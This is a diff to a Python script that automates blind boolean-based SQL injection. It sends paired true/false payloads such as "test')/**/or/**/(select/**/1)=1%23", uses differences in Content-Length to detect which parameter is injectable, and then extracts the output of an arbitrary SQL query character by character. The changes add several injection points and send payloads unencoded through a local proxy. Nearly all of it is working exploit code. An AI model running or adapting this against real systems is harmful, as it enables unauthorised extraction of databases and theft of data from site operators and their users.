@@ -1,14 +1,18 @@
 import sys
 import requests
 import argparse
-from urllib.parse import parse_qsl
+from urllib.parse import parse_qsl, urlencode
 
 def response_length(data, param, payload):
-    data[param]=payload
+    inj_dict = data.copy()
+    inj_dict[param]=payload
+    #prevent url encoding the payload
+    inj_str= urlencode(inj_dict, safe="'/*%()=&")
+
     if args['method'] == 'GET':
-        result = requests.get(args['url'], params=data)
+        result = requests.get(args['url'], params=inj_str)
     elif args['method'] == 'POST':
-        result = requests.post(args['url'], data=data)
+        result = requests.post(args['url'], data=inj_str, headers={'Content-Type': 'application/x-www-form-urlencoded'}, proxies={"http":"http://127.0.0.1:8080"})
     return int(result.headers['Content-Length'])
 
 
@@ -36,23 +40,30 @@ def main():
     args = vars(parser.parse_args())
     query = args['sql'].replace(' ', '/**/')
     data=dict(parse_qsl(args['data']))
+
+    injection_points=["test'/**/or/**/", "test')/**/or/**/"]
     # checking all params from data
     for param in data:
-        print('Checking parametr {}...'.format(param))
-        # making assumption that True and False answers has different Content-Length header and True>False
-        true_len=response_length(data, param, "test')/**/or/**/(select/**/1)=1%23")
-        false_len=response_length(data, param, "test')/**/or/**/(select/**/0)=1%23")
-        if true_len>false_len:
-            print('(+) Parametrs {} is vulnerable. Starting the injection'.format(param))
-            vulnerable_param = param
-            break
+        for point in injection_points:
+            print('Checking parametr {} with injection {}'.format(param, point))
+            # making assumption that True and False answers has different Content-Length header and True>False
+            true_len=response_length(data, param, "{}(select/**/1)=1%23".format(point))
+            false_len=response_length(data, param, "{}(select/**/0)=1%23".format(point))
+            if true_len>false_len:
+                print('(+) Parametrs {} is vulnerable to injection {}. Starting the exploit'.format(param, point))
+                vulnerable_param = param
+                vulnerable_point = point
+                break
+        else:
+            continue
+        break
     if (true_len==false_len):
         print('(-) Entry point is not vulnerable to injection')
         sys.exit()
     #guessing each character from SQL query result
     i = 1
     while True:
-        injection_string = "test')/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]%23".format( query, i )
+        injection_string = "{}(ascii(substring(({}),{},1)))=[CHAR]%23".format(vulnerable_point, query, i )
         try:
             extracted_char = chr(sqli(data, vulnerable_param, injection_string, true_len)) 
             print(extracted_char, end='', flush=True)
